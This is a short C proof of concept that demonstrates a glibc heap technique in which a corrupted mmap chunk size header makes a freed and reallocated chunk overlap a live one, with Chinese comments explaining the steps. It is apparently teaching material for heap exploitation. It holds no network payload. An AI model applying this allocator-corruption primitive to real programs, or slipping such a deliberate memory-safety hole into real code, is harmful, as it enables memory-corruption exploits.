#include <stdlib.h>
#include <stdio.h>
#include <assert.h>

int main()
{
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

    int *ptr1 = malloc(0x10);
    long long *top_ptr = malloc(0x100000); // size: 0x101000
    long long *mmap_chunk_2 = malloc(0x100000); // size: 0x101000
    long long *mmap_chunk_3 = malloc(0x100000); // size: 0x101000
    printf("\nCurrent System Memory Layout \n"
           "================================================\n"
           "running program\n"
           "heap\n"
           "....\n"
           "third mmap chunk\n"
           "second mmap chunk\n"
           "first mmap chunk\n"
           "LibC\n"
           "ld\n"
           "===============================================\n\n");


    // ! vuln
    // modified size: 0x202000
    mmap_chunk_3[-1] = (0xFFFFFFFFFD & mmap_chunk_3[-1]) + (0xFFFFFFFFFD & mmap_chunk_2[-1]) | 2;
    free(mmap_chunk_3);

    // 因為 mmap.threshold 增加到 0x202000，因此要請求更大塊的記憶體空間
    long long *overlapping_chunk = malloc(0x300000);
    overlapping_chunk[mmap_chunk_2 - overlapping_chunk] = 0x1122334455667788;

    // 新請求的 chunk 會與 mmap_chunk_2 (舊的 chunk) 重疊
    assert(mmap_chunk_2[0] == overlapping_chunk[mmap_chunk_2 - overlapping_chunk]);
}